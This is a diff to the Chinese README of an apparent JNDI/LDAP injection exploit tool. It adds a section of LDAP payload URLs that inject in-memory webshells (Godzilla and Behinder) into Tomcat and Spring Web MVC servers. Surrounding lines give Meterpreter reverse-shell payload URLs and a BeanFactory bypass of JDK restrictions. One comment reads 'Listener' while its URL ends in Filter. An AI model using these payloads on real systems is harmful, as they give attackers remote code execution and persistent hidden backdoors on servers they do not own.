@@ -76,7 +76,30 @@ ldap://127.0.0.1:1389/Basic/Meterpreter/127.0.0.1/4444
 ldap://127.0.0.1:1389/Basic/Meterpreter/MTI3LjAuMC4x/NDQ0NA==
 ```
 
-## BeanFactory Bypass
+## 内存马注入
+
+基于 [MemShellParty](https://github.com/ReaJason/MemShellParty) 项目
+
+目前仅支持通过 Basic/BeanFactory 路由注入内存马
+
+```bash
+# 格式
+ldap://127.0.0.1:1389/Basic/MemShell/{server}/{tool}/{type}
+
+# Tomcat Godzilla Filter
+ldap://127.0.0.1:1389/Basic/MemShell/Tomcat/Godzilla/Filter
+# Tomcat Godzilla Listener
+ldap://127.0.0.1:1389/Basic/MemShell/Tomcat/Godzilla/Filter
+
+# Spring Web MVC Behinder Interceptor
+ldap://127.0.0.1:1389/Basic/MemShell/SpringWebMvc/Behinder/Interceptor
+# Spring Web MVC Behinder Controller
+ldap://127.0.0.1:1389/Basic/MemShell/SpringWebMvc/Behinder/ControllerHandler
+
+# 更多内存马类型参考 MemShellParty README
+```
+
+## BeanFactory 绕过
 
 基于 BeanFactory 绕过高版本 JDK 限制, Tomcat 版本需小于 8.5.79 或 9.0.63
 
